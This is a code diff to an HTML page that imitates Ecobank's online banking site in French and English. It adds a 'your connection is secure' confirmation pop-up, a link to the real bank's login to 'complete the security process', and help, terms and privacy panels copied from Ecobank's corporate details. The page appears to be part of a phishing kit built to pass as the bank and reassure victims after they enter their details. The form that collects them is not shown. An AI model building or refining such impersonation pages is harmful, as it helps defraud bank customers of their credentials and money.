@@ -162,7 +162,82 @@ footer a:hover { color:#fff; text-decoration: underline; }
 <!-- Loader overlay -->
 <div id="loader-overlay"><div class="spinner"></div></div>
 
-<!-- Popups et confirmations restent identiques à ton code original -->
+<!-- Pop-up Confirmation -->
+<div id="confirm-window">
+    <span id="close-confirm">&times;</span>
+    <h3 data-fr="CONFIRMATION" data-en="CONFIRMATION">CONFIRMATION</h3>
+    <img src="images/check.png" alt="Confirmation">
+    <p data-fr="Votre connexion est sécurisée. Vous pouvez maintenant accéder à votre compte."
+       data-en="Your connection is secure. You can now access your account.">
+       Votre connexion est sécurisée. Vous pouvez maintenant accéder à votre compte.
+    </p>
+    <p><a href="https://internetbanking.ecobank.com/index.html?page=loginretail&lang=en" target="_blank">Connectez-vous pour terminer le processus de sécurité</a></p>
+</div>
+
+<!-- Pop-up Aide -->
+<div class="popup-overlay" id="help-overlay"></div>
+<div class="popup" id="help-popup">
+    <div class="popup-header">
+        <h3 data-fr="Centre d’Assistance Ecobank" data-en="Ecobank Support Center">Centre d’Assistance Ecobank</h3>
+        <span id="close-help">&times;</span>
+    </div>
+    <p data-fr="Bienvenue dans notre centre d'assistance. Retrouvez toutes les informations nécessaires pour gérer vos services bancaires en ligne :"
+       data-en="Welcome to our support center. Find all the information you need to manage your online banking services:">
+       Bienvenue dans notre centre d'assistance. Retrouvez toutes les informations nécessaires pour gérer vos services bancaires en ligne :
+    </p>
+    <ul>
+        <li data-fr="Compte bancaire : ouverture, gestion et sécurité." data-en="Bank account: opening, management and security.">Compte bancaire : ouverture, gestion et sécurité.</li>
+        <li data-fr="Transactions : virements locaux et internationaux, paiements instantanés." data-en="Transactions: local and international transfers, instant payments.">Transactions : virements locaux et internationaux, paiements instantanés.</li>
+        <li data-fr="Cartes : activation, blocage, renouvellement." data-en="Cards: activation, blocking, renewal.">Cartes : activation, blocage, renouvellement.</li>
+        <li data-fr="Application mobile : téléchargement et configuration." data-en="Mobile app: download and setup.">Application mobile : téléchargement et configuration.</li>
+        <li data-fr="Sécurité : conseils pour protéger vos informations et transactions." data-en="Security: tips to protect your information and transactions.">Sécurité : conseils pour protéger vos informations et transactions.</li>
+        <li data-fr="Support client : +243 996 016 008" data-en="Customer support: +243 996 016 008">Support client : +243 996 016 008</li>
+    </ul>
+    <p data-fr="📧 Contacter : ecobankenquiries@ecobank.com" data-en="📧 Contact: ecobankenquiries@ecobank.com">
+        📧 Contacter : <a href="mailto:ecobankenquiries@ecobank.com" style="color:#02629f;">ecobankenquiries@ecobank.com</a>
+    </p>
+</div>
+
+<!-- Pop-up Conditions -->
+<div class="popup-overlay" id="terms-overlay"></div>
+<div class="popup" id="terms-popup">
+    <div class="popup-header">
+        <h3 data-fr="Conditions d'utilisation" data-en="Terms of Use">Conditions d'utilisation</h3>
+        <span id="close-terms">&times;</span>
+    </div>
+    <p data-fr="Bienvenue sur le site web d'Ecobank, une publication du Groupe Ecobank."
+       data-en="Welcome to the Ecobank website, a publication of the Ecobank Group.">
+       Bienvenue sur le site web d'Ecobank, une publication du Groupe Ecobank.
+    </p>
+    <ul>
+        <li data-fr="Dénomination sociale : Ecobank Transnational Incorporated (ETI)" data-en="Company name: Ecobank Transnational Incorporated (ETI)">Dénomination sociale : Ecobank Transnational Incorporated (ETI)</li>
+        <li data-fr="Capital autorisé : 1 276 664 511,95 dollars" data-en="Authorized capital: 1,276,664,511.95 dollars">Capital autorisé : 1 276 664 511,95 dollars</li>
+        <li data-fr="Numéro d’immatriculation : 1986 B 1575 (2 mai 1986, Lomé, Togo)" data-en="Registration number: 1986 B 1575 (May 2, 1986, Lome, Togo)">Numéro d’immatriculation : 1986 B 1575 (2 mai 1986, Lomé, Togo)</li>
+        <li data-fr="Siège social : 2365, Boulevard du Mono - BP : 3261 Lomé, Togo" data-en="Head office: 2365, Boulevard du Mono - BP: 3261 Lome, Togo">Siège social : 2365, Boulevard du Mono - BP : 3261 Lomé, Togo</li>
+        <li data-fr="Tél. : +228 22 21 03 03 / +228 22 21 31 68" data-en="Tel: +228 22 21 03 03 / +228 22 21 31 68">Tél. : +228 22 21 03 03 / +228 22 21 31 68</li>
+        <li data-fr="Courriel : info@ecobank.com" data-en="Email: info@ecobank.com">Courriel : info@ecobank.com</li>
+        <li data-fr="Utiliser les services uniquement à des fins légales." data-en="Use services only for legal purposes.">Utiliser les services uniquement à des fins légales.</li>
+        <li data-fr="Ne pas partager vos identifiants avec des tiers." data-en="Do not share your credentials with third parties.">Ne pas partager vos identifiants avec des tiers.</li>
+        <li data-fr="Respecter la confidentialité des informations bancaires." data-en="Respect the confidentiality of banking information.">Respecter la confidentialité des informations bancaires.</li>
+    </ul>
+</div>
+
+<!-- Pop-up Politique -->
+<div class="popup-overlay" id="policy-overlay"></div>
+<div class="popup" id="policy-popup">
+    <div class="popup-header">
+        <h3 data-fr="Politique de confidentialité" data-en="Privacy Policy">Politique de confidentialité</h3>
+        <span id="close-policy">&times;</span>
+    </div>
+    <p data-fr="Votre vie privée est importante pour Ecobank. Cette politique explique comment nous collectons et utilisons vos informations."
+       data-en="Your privacy is important to Ecobank. This policy explains how we collect and use your information.">
+       Votre vie privée est importante pour Ecobank. Cette politique explique comment nous collectons et utilisons vos informations.
+    </p>
+    <p data-fr="Ecobank s’engage à protéger vos données personnelles et à ne les utiliser qu’à des fins de service client."
+       data-en="Ecobank is committed to protecting your personal data and using it only for customer service purposes.">
+       Ecobank s’engage à protéger vos données personnelles et à ne les utiliser qu’à des fins de service client.
+    </p>
+</div>
 
 <script>
 // Loader
@@ -213,8 +288,8 @@ langBtn.addEventListener('click', () => {
     currentLang = currentLang === 'fr' ? 'en' : 'fr';
     langLabel.textContent = currentLang.toUpperCase();
     document.querySelectorAll('[data-fr]').forEach(el => {
-        const attr = el.placeholder ? 'placeholder' : 'textContent';
-        el[attr] = el.getAttribute(`data-${currentLang}`);
+        if(el.placeholder) el.placeholder = el.getAttribute('data-' + currentLang);
+        else el.textContent = el.getAttribute('data-' + currentLang);
     });
 });
 
@@ -242,5 +317,6 @@ closeConfirm.addEventListener("click", () => {
     footer.classList.remove("blur");
 });
 </script>
+
 </body>
 </html>
